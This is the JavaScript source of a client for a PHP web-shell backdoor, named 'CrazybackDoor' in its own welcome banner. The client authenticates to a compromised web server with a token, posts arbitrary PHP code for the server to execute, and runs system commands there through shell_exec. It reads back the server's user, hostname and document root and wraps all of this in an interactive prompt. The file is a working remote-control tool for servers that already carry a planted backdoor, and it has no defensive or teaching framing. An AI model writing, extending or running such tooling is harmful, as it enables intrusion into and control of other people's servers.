var term = require('terminal-kit').terminal;
var termkit = require('terminal-kit');
var parse = require('shell-parse');
var glob = require('glob');
var axios = require('axios');
var url = require('url');
var qs = require('qs');

class Shell{

	constructor(){
		this.commands = [];
		glob('./commands/*.js', (err, file) => {
			this.commands.push(file);
		});

		//console.log(this.commands);

		term.on('key', (key) => {
			if (key === 'CTRL_C'){
				this.quit();
			}
		});

	}

	async init(host, token){
		if(await this.auth(host, token)){
			this.welcomeScreen();
			this.input();
		}
	}

	welcomeScreen(){
		term.white('\nWelcome on ').bold.red('CrazybackDoor').white(' client!\n');
		term.white('You are connecting from : ').blue(this.entrypoint+'\n\n');
	}

	async auth(host, token){
		term.blue('Connecting...\n');
		this.entrypoint = host;
		this.token = token;

		let data = await this.php(`return [
				'sucess' => true, 
				'pwd' => $_SERVER['DOCUMENT_ROOT'],
				'whoami' => get_current_user(),
				'hostname' => gethostname()
		];`);


        this.user = data.whoami;
        this.hostname = data.hostname;


		if(data.sucess !== true){
			term.red('Connection failed.');
			this.quit();
			return false;
		}
		this.pwd = data.pwd;
		return true;
	}

	ps1(){
		term.white(  '╭─').bold.red(this.user+'@'+this.hostname+' ').blue(this.pwd);
		term.white("\n╰─$ ");
	}

	input(){
		this.ps1();

		term.inputField({
			autoComplete : (input, callback) => {
				let returns = [];
				if(input.match(/^([a-zA-Z0-9]+)$/)){
					returns = ['ls', 'cat', 'df', 'du'];
				}
				callback( undefined , termkit.autoComplete(returns, input, true));
			},
			autoCompleteHint: true,
			autoCompleteMenu: true,
		} ,
		( error , raw ) => {
			term('\n');
			let input = parse(raw);
			input.forEach((expression) => {
				let module = './commands/'+expression.command.value;
				delete require.cache[require.resolve(module)]
				let cmd = require(module);
				cmd.exec(expression, raw, this);
			});
		});
	}

	async php(request){
		const res = await axios.post(this.entrypoint, qs.stringify({
			'c' : `ob_clean();
			header('Content-Type: application/json');
			function crazyexec(){`+request+`}
			echo json_encode([
				'result' => crazyexec(),
			]);
			exit;`,
			'p' : this.token
		}));
		return res.data.result;
	}

	async stream(request){
		const result = await axios.post(this.entrypoint, qs.stringify({
			'c' : request+` echo 'end'; exit;`,
			'p' : this.token
		}), {
			responseType:'stream'
		});
		console.log(result);
		return result;
	}

	async sh(cmd, input, after=''){
		let args = input.args.map((i) => {
			return i.value;
		}).join(' ');

		/*return await this.stream(`
			error_reporting(E_ALL);
			ini_set('display_errors', 1);
			$cmd = '`+cmd+` `+args+` `+after+`';

			$descriptorspec = array(
			   0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
			   1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
			   2 => array("pipe", "w")    // stderr is a pipe that the child will write to
			);
			flush();
			$process = proc_open($cmd, $descriptorspec, $pipes, '`+this.pwd+`', array());
			if (is_resource($process)) {
			    while ($s = fgets($pipes[1])) {
			        print $s;
			        flush();
			    }
			}`);*/
		return await this.php(`return shell_exec("`+cmd+` `+args+` `+after+`");`);
	}

	quit(){
		term.red('\nQuitting... Bye\n');
		term.grabInput(false);
		process.exit();
	}
}

module.exports = Shell;